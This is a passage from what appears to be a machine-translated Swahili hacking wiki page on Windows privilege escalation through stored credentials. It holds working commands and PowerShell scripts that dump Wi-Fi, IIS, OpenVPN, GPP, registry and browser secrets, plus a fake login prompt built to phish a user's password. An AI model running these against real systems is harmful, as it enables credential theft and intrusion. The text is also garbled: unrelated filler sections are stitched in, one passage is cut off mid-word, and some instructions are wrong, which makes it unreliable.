- **Brute Force Attack**: This involves attempting to guess the wifi network's password by systematically trying all possible combinations until the correct one is found.
- **Dictionary Attack**: Similar to a brute force attack, but instead of trying all possible combinations, it uses a pre-generated list of commonly used passwords.
- **Man-in-the-Middle Attack**: In this attack, an attacker intercepts the communication between a device and the wifi network, allowing them to eavesdrop on the data being transmitted.
- **Evil Twin Attack**: This involves creating a fake wifi network with the same name as a legitimate network, tricking users into connecting to it and potentially exposing their data.
- **WPS Attack**: Some wifi routers have a feature called Wi-Fi Protected Setup (WPS), which allows users to easily connect to the network. However, this feature can be exploited by attackers to gain unauthorized access to the network.

#### Wifi Best Practices

To enhance the security of your wifi network, consider following these best practices:

- Use a strong, unique password for your wifi network.
- Regularly update your router's firmware to ensure it has the latest security patches.
- Disable WPS if it is not needed.
- Enable network encryption (WPA2 or higher) to protect the data being transmitted over the network.
- Change the default SSID (network name) of your wifi network to something unique.
- Disable remote administration of your router to prevent unauthorized access.

By following these best practices, you can significantly reduce the risk of unauthorized access to your wifi network and protect your data from potential attacks.
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kumbukumbu za Uunganisho wa RDP Uliohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotekelezwa Hivi Karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja wa Vitambulisho vya Kuingia Kijijini**

- On Windows systems, the Remote Desktop Credential Manager is a feature that allows users to save their login credentials for remote desktop connections.
- Kwenye mifumo ya Windows, Meneja wa Vitambulisho vya Kuingia Kijijini ni kipengele kinachowezesha watumiaji kuokoa vitambulisho vyao vya kuingia kwa ajili ya uunganisho wa kijijini wa desktop.

- These credentials are stored in the Windows Credential Manager, which is a secure storage area for usernames and passwords.
- Vitambulisho hivi hifadhiwa katika Meneja wa Vitambulisho wa Windows, ambao ni eneo salama la kuhifadhi majina ya watumiaji na nywila.

- As a hacker, you can target the Remote Desktop Credential Manager to gain access to these saved credentials and potentially escalate your privileges.
- Kama mhalifu wa mtandao, unaweza kulenga Meneja wa Vitambulisho vya Kuingia Kijijini ili kupata ufikiaji wa vitambulisho vilivyohifadhiwa na huenda kuongeza haki zako.

- There are various techniques you can use to exploit this feature, such as using a keylogger or extracting the credentials from the Windows registry.
- Kuna njia mbalimbali unazoweza kutumia kudukua kipengele hiki, kama vile kutumia keylogger au kuchukua vitambulisho kutoka kwenye rejista ya Windows.

- It is important to note that exploiting the Remote Desktop Credential Manager is illegal and unethical unless you have proper authorization to do so.
- Ni muhimu kuzingatia kwamba kudukua Meneja wa Vitambulisho vya Kuingia Kijijini ni kinyume cha sheria na si maadili isipokuwa una idhini sahihi ya kufanya hivyo.
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia moduli ya **Mimikatz** `dpapi::rdg` na `/masterkey` sahihi ku **kufichua faili za .rdg**\
Unaweza **kuchimbua DPAPI masterkeys nyingi** kutoka kumbukumbu kwa kutumia moduli ya Mimikatz `sekurlsa::dpapi`

### Noti za Kufunga

Wat
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia ikiwa `C:\Windows\CCM\SCClient.exe` ipo.\
Wakati wa kufunga programu, inatekelezwa kwa **mamlaka ya SYSTEM**, nyingi zinaweza kuwa na udhaifu wa **DLL Sideloading (Maelezo kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Usajili (Majina ya Utambulisho)

### Vyeti vya Putty

```plaintext
Putty stores its credentials in the Windows registry under the following key:

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions

Each session created in Putty is stored as a subkey under the "Sessions" key. The session subkeys contain values for the session configuration, including the username and password used for authentication.

To extract the credentials, you can navigate to the "Sessions" key in the registry and look for the desired session subkey. The username and password values can be found within the subkey's values.

It's important to note that the passwords stored in the registry are encrypted. However, there are tools available that can decrypt these passwords, such as "Mimikatz" or "LaZagne".

Keep in mind that extracting credentials from the registry may be considered illegal or unethical without proper authorization. Always ensure you have the necessary permissions and legal rights before attempting any actions.
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Vichimbakazi vya Wenyeji wa Putty SSH

Putty ni programu ya mteja wa SSH inayotumiwa kwa kawaida kwa kuingia kwa mbali kwenye seva. Wakati unatumia Putty kwa mara ya kwanza kuingia kwenye seva, itakuhitaji kukubali au kuthibitisha ufunguo wa mwenyeji wa SSH kabla ya kuendelea. Ufunguo huu wa mwenyeji unahakikisha kuwa unawasiliana na seva sahihi na sio seva ya uongo.

Ufunguo wa mwenyeji wa SSH unapatikana kwenye faili ya "known_hosts" kwenye mfumo wako. Faili hii inaorodhesha ufunguo wa mwenyeji wa SSH kwa kila seva ambayo umewahi kuunganisha kupitia Putty. Kwa kawaida, faili hii iko katika saraka ya nyumbani ya mtumiaji wako.

Ikiwa unataka kusafisha au kusasisha ufunguo wa mwenyeji wa SSH kwenye Putty, unaweza kufuata hatua zifuatazo:

1. Fungua Putty na nenda kwenye "SSH" kwenye menyu ya kushoto.
2. Chagua "Auth" chini ya "SSH" na bofya kwenye kisanduku cha "Browse" chini ya "Private key file for authentication".
3. Chagua faili ya ufunguo wa mwenyeji wa SSH unayotaka kutumia.
4. Bofya "Open" ili kuanza kuingia kwenye seva.

Baada ya kufuata hatua hizi, Putty itatumia ufunguo wa mwenyeji wa SSH uliochaguliwa kwa kuingia kwenye seva. Ni muhimu kuhakikisha kuwa ufunguo wa mwenyeji wa SSH unalingana na ufunguo wa mwenyeji uliohifadhiwa kwenye faili ya "known_hosts" ili kuepuka shida za usalama.
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Vichimbakazi vya SSH kwenye rejista

Vichimbakazi vya SSH vya kibinafsi vinaweza kuhifadhiwa ndani ya ufunguo wa rejista `HKCU\Software\OpenSSH\Agent\Keys` hivyo unapaswa kuangalia ikiwa kuna kitu chochote cha kuvutia ndani yake:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ikiwa utapata kuingia yoyote ndani ya njia hiyo, labda itakuwa funguo ya SSH iliyohifadhiwa. Inahifadhiwa kwa njia ya kusimbwa lakini inaweza kufunguliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
Maelezo zaidi kuhusu mbinu hii yanapatikana hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haiendeshi na unataka ianze moja kwa moja wakati wa kuanza, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Inaonekana kwamba mbinu hii haifai tena. Nilijaribu kuunda baadhi ya funguo za ssh, kuziweka kwa kutumia `ssh-add` na kuingia kupitia ssh kwenye kifaa. Usajili wa HKCU\Software\OpenSSH\Agent\Keys haupo na procmon haikugundua matumizi ya `dpapi.dll` wakati wa uwakilishi wa funguo usio sawa.
{% endhint %}

### Faili zisizohitaji ushiriki wa mtumiaji
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum\_unattend_

Mfano wa maudhui:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Nakala za SAM & SYSTEM

Kwa kawaida, Windows hufanya nakala za faili za SAM na SYSTEM kwenye folda ya `C:\Windows\System32\config\RegBack`. Nakala hizi zinaweza kutumika kwa kusudi la kurejesha faili za asili za SAM na SYSTEM ikiwa zinaharibiwa au kuharibiwa vibaya.

Unaweza kufikia nakala hizi kwa kufuata hatua zifuatazo:

1. Nenda kwenye folda ya `C:\Windows\System32\config\RegBack`.
2. Fungua nakala ya hivi karibuni ya faili ya SAM na SYSTEM.
3. Nakala hizi zinaweza kuwa zimehifadhiwa kwenye folda ya `C:\Windows\System32\config\RegBack\RegBack`.

Ni muhimu kutambua kuwa nakala hizi za SAM na SYSTEM zinaweza kuwa zimepitwa na wakati au zisizofaa kwa sababu zinaweza kuwa zimefanyiwa mabadiliko au kuharibiwa. Kwa hivyo, ni muhimu kuzingatia hili wakati wa kuzitumia kwa madhumuni ya kurejesha.
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Vitambulisho vya Wingu

Cloud credentials ni maelezo ya uwakilishi ambayo hutumiwa kuthibitisha utambulisho na kutoa ufikiaji wa rasilimali za wingu. Vitambulisho hivi ni muhimu sana katika mazingira ya wingu kwa sababu hutoa njia ya kudhibiti ufikiaji na usimamizi wa rasilimali hizo.

Kuna aina mbili kuu za vitambulisho vya wingu:

1. **Access Keys**: Hizi ni jozi ya ufunguo wa siri na ufunguo wa umma ambao hutumiwa kuthibitisha utambulisho wa mtumiaji na kutoa ufikiaji wa rasilimali za wingu. Ufunguo wa siri unapaswa kuhifadhiwa salama na sio kugawanywa na mtu yeyote isipokuwa mmiliki wa akaunti. Ufunguo wa umma unaweza kugawanywa na kutumiwa na huduma za wingu kuthibitisha utambulisho wa mtumiaji.

2. **IAM Roles**: Hizi ni vitambulisho vya wingu ambavyo hutoa ufikiaji wa rasilimali za wingu kwa watumiaji au huduma zingine za wingu. IAM roles zinaweza kuwa na sifa zilizopewa ambazo zinadhibiti ni rasilimali gani zinazopatikana na jinsi wanavyoweza kutumiwa.

Ni muhimu sana kulinda vitambulisho vya wingu na kutekeleza mazoea bora ya usalama kama vile kuzificha vizuri, kuzibadilisha mara kwa mara, na kuzitumia tu wakati zinahitajika. Pia, ni muhimu kufuatilia na kusasisha vitambulisho vya wingu ili kuzuia matumizi yasiyoruhusiwa na kudumisha usalama wa rasilimali za wingu.
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Cached GPP Password

Kipengele kilikuwepo hapo awali ambacho kiliruhusu kupeleka akaunti za msimamizi wa ndani za desturi kwenye kikundi cha mashine kupitia Sera ya Kikundi ya Mapendeleo (GPP). Walakini, njia hii ilikuwa na dosari kubwa za usalama. Kwanza, Vitu vya Sera ya Kikundi (GPOs), vilivyohifadhiwa kama faili za XML katika SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa kikoa. Pili, nywila katika GPP hizi, zilizofichwa kwa kutumia AES256 kwa kutumia ufunguo wa chaguo-msingi ulioelezewa kwa umma, zingeweza kufichuliwa na mtumiaji yeyote aliyeidhinishwa. Hii ilikuwa na hatari kubwa, kwani inaweza kuruhusu watumiaji kupata mamlaka ya juu.

Kupunguza hatari hii, kazi ilibuniwa ili kutafuta faili za GPP zilizohifadhiwa kwenye kache ambazo zina uga wa "cpassword" ambao sio tupu. Kupata faili kama hiyo, kazi inafichua nywila na kurudisha kitu cha PowerShell cha desturi. Kitu hiki kinajumuisha maelezo juu ya GPP na eneo la faili, kusaidia katika kutambua na kurekebisha dosari hii ya usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_ kwa faili hizi:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Kufichua cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata nywila:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config

### IIS Web Config

IIS Web Config ni faili ya konfigurisheni ambayo inatumika kudhibiti na kusanidi tovuti zilizohifadhiwa kwenye seva ya IIS (Internet Information Services). Faili hii ina muundo wa XML na ina habari muhimu kuhusu jinsi tovuti inavyofanya kazi na inavyopatikana.

Kwa kawaida, faili ya IIS Web Config iko katika saraka ya msingi ya tovuti na inaweza kuhaririwa kwa kutumia mhariri wa maandishi au zana maalum za usimamizi wa IIS.

Faili ya IIS Web Config inaweza kubadilishwa ili kufanya mabadiliko kadhaa kwenye tovuti, kama vile kubadilisha mipangilio ya usalama, kuanzisha upya mipangilio ya URL, kudhibiti ufikiaji wa faili na saraka, na mengi zaidi.

Kwa wapenzi wa udukuzi, faili ya IIS Web Config inaweza kuwa muhimu katika kutekeleza mbinu za kuboresha mamlaka ya ndani (local privilege escalation) kwenye mfumo wa Windows. Kwa kuchunguza na kuhariri faili hii, unaweza kupata maelezo muhimu ambayo yanaweza kukusaidia kupata mamlaka ya juu zaidi kwenye mfumo.
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config na siri za kuwakilisha:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Vyeti vya OpenVPN

Kabla ya kuanza kufanya uchunguzi wa kina wa kuhakiki hatari za usalama, ni muhimu kupata vyeti vya OpenVPN. Vyeti hivi ni muhimu kwa kuanzisha uhusiano salama na seva ya OpenVPN. Kwa kawaida, vyeti vya OpenVPN hujumuisha faili mbili: faili ya ufunguo wa umma (public key) na faili ya ufunguo wa faragha (private key).

Kwa kawaida, faili ya ufunguo wa umma ina kumalizia na .crt na faili ya ufunguo wa faragha ina kumalizia na .key. Vyote viwili ni muhimu kwa mchakato wa uwakilishi wa vyeti vya OpenVPN.

Kwa kawaida, vyeti vya OpenVPN hupatikana kutoka kwa msimamizi wa mfumo au mtoa huduma wa OpenVPN. Ikiwa wewe ni mtumiaji wa OpenVPN, unaweza kuomba vyeti hivi kutoka kwa msimamizi wako au mtoa huduma wa OpenVPN. Vyeti hivi vinapaswa kuhifadhiwa kwa usalama na kutumiwa tu na watumiaji waliothibitishwa.
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Kumbukumbu

Logs are records of events or actions that have occurred on a system. They are essential for troubleshooting, monitoring, and investigating security incidents. In the context of local privilege escalation, logs can be valuable sources of information for identifying vulnerabilities and potential attack vectors.

#### Windows Event Logs

Windows systems maintain various event logs that capture different types of events. Some of the key event logs include:

- **Security**: Records security-related events such as logon attempts, privilege use, and system access.
- **System**: Contains information about system events, such as startup and shutdown.
- **Application**: Logs events generated by applications running on the system.

These logs can be accessed using the Event Viewer tool or programmatically through the Windows Event Log API.

#### Log Analysis

Analyzing logs can help identify suspicious activities or indicators of compromise. Some common techniques for log analysis include:

- **Searching for specific events**: Look for events related to privilege escalation, suspicious user activity, or unauthorized access attempts.
- **Correlation**: Identify patterns or relationships between different log entries to gain a better understanding of the attack.
- **Timeline analysis**: Construct a timeline of events to determine the sequence of actions taken by an attacker.
- **Anomaly detection**: Use machine learning or statistical techniques to identify abnormal or unusual behavior.

#### Log Retention

It is important to ensure that logs are properly configured and retained for an appropriate period. Retaining logs for an extended period can be useful for forensic investigations and compliance requirements.

#### Log Monitoring

Implementing a log monitoring solution can help detect and respond to security incidents in a timely manner. This can involve setting up alerts for specific events, aggregating logs from multiple sources, and using automated analysis tools.

#### Log Integrity

To maintain the integrity of logs, it is crucial to protect them from unauthorized modification or deletion. This can be achieved by implementing access controls, using secure storage, and regularly backing up logs.

#### Conclusion

Logs play a vital role in local privilege escalation and overall system security. By effectively analyzing and monitoring logs, organizations can detect and mitigate potential security risks.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Uliza kwa sifa

Unaweza daima **kuomba mtumiaji kuingiza sifa zake au hata sifa za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (tambua kuwa **kuuliza** moja kwa moja kwa **mteja** kwa **sifa** ni hatari sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina yanayowezekana ya faili zinazohifadhi siri**

Faili maarufu ambazo kwa wakati mmoja zilikuwa zinahifadhi **maneno ya siri** kwa njia ya maandishi wazi au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tafuta faili zote zilizopendekezwa:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Vitambulisho katika RecycleBin

Unapaswa pia kuangalia Bin ili kutafuta vitambulisho ndani yake.

Kwa **kurejesha nywila** zilizohifadhiwa na programu kadhaa, unaweza kutumia: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Ndani ya usajili

**Vitufe vingine vya usajili vinavyowezekana na vitambulisho**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Chukua funguo za openssh kutoka kwenye rejista.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kuangalia kwa ajili ya dbs ambapo nywila kutoka **Chrome au Firefox** zimehifadhiwa.\
Pia angalia historia, alamisho na vipendwa vya vivinjari ili labda baadhi ya **nywila zimehifadhiwa** hapo.

Zana za kuchimbua nywila kutoka kwenye vivinjari:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows ambayo inaruhusu **mawasiliano** kati ya vipengele vya programu za lugha tofauti. Kila kipengele cha COM kina **kitambulisho cha darasa (CLSID)** na kila kipengele kinaweka wazi utendaji kupitia moja au zaidi ya vipengele vya interface, vilivyotambulishwa kupitia kitambulisho cha interface (IID).

Madarasa na vipengele vya COM vimefafanuliwa kwenye rejista chini ya **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** na **HKEY\_**_**CLASSES\_**_**ROOT\Interface** mtawaliwa. Rejista hii inaundwa kwa kuchanganya **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Ndani ya CLSIDs ya rejista hii, unaweza kupata rejista ya mtoto **InProcServer32** ambayo ina thamani ya **default** inayoelekeza kwenye **DLL** na thamani inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![](<../../.gitbook/assets/image (638).png>)

Kimsingi, ikiwa unaweza **kubadilisha DLL yoyote** ambayo itatekelezwa, unaweza **kuongeza mamlaka** ikiwa DLL hiyo itatekelezwa na mtumiaji tofauti.

Ili kujifunza jinsi wadukuzi wanatumia COM Hijacking kama kipengele cha kudumu angalia:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Utafutaji wa Nywila za Kawaida kwenye faili na rejista**

**Tafuta maudhui ya faili**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili yenye jina fulani**

Ikiwa unataka kutafuta faili yenye jina fulani kwenye mfumo wa Windows, unaweza kutumia amri ya `dir` kwenye Command Prompt. Amri ifuatayo itakusaidia kutafuta faili kwa jina lake:

```plaintext
dir /s /b "jina_la_faili"
```

- `/s` inaonyesha kuwa utafutaji utafanyika kwa njia ya rekodi zote, pamoja na folda zote zilizomo ndani ya folda kuu.
- `/b` inaonyesha kuwa matokeo yataonyeshwa kwa njia ya njia kamili ya faili.

Kwa mfano, ikiwa unataka kutafuta faili inayoitwa "document.txt", tumia amri ifuatayo:

```plaintext
dir /s /b "document.txt"
```

Amri hii itakupa njia kamili ya faili ikiwa faili hiyo ipo kwenye mfumo wako.
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta usajili kwa majina ya funguo na nywila**

Unaweza kutumia zana kama `reg` au `reg query` kutafuta usajili kwa majina ya funguo na nywila. Hapa kuna hatua za kufuata:

1. Fungua Command Prompt (Amri ya Amri) kama msimamizi.
2. Tumia amri ifuatayo kuchunguza usajili kwa majina ya funguo na nywila:

   ```plaintext
   reg query HKLM /f "password" /t REG_SZ /s
   ```

   Amri hii itatafuta usajili katika sehemu ya HKLM (HKEY_LOCAL_MACHINE) kwa majina ya funguo yaliyomo "password" na aina ya REG_SZ (aina ya neno la msingi). /s inaonyesha kutafuta kwa kina ndani ya usajili.

3. Unaweza kubadilisha "password" na neno lingine au kuongeza vigezo vingine kulingana na mahitaji yako.

Kwa kutumia amri hii, unaweza kutambua majina ya funguo na nywila zilizohifadhiwa kwenye usajili wa mfumo wako.
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Zana za kutafuta nywila

